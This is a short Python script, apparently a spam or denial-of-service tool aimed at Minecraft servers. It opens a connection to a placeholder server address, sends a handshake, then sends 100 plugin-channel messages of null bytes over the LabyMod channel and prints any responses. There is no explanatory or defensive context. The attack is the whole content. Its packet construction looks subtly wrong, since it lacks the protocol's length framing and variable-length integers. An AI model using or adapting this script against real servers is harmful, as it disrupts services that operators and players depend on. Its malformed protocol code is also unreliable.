import socket
import struct
import time

target_host = "<SERVER_IP>"
target_port = <SERVER_PORT>

def build_handshake(host, port):
    host_bytes = host.encode("utf-8")
    packet_id = b"\x00"
    protocol_version = struct.pack(">I", 754)
    host_length = struct.pack("B", len(host_bytes))
    port_bytes = struct.pack(">H", port)
    next_state = b"\x01"
    return packet_id + protocol_version + host_length + host_bytes + port_bytes + next_state

laby_mod_channel = "<CHANNEL>".encode("utf-8") # usually laby:mod
spam_payload = b"\x00" * 100

def build_plugin_message(channel, data):
    if len(channel) > 255:
        raise ValueError("Channel name exceeds maximum length")
    channel_length = struct.pack("B", len(channel))
    return channel_length + channel + data

def send_payload(payload):
    try:
        with socket.create_connection((target_host, target_port)) as sock:
            handshake_packet = build_handshake(target_host, target_port)
            sock.sendall(handshake_packet)
            for i in range(100):
                plugin_message = build_plugin_message(laby_mod_channel, payload)
                sock.sendall(plugin_message)
                try:
                    response = sock.recv(1024)
                    if response:
                        print(f"Server responded: {response.decode(errors='ignore')}")
                except socket.timeout:
                    print(f"No response from server for payload {i + 1}")
                time.sleep(0.1)
    except Exception as e:
        print("Error during payload transmission:", e)

send_payload(spam_payload)
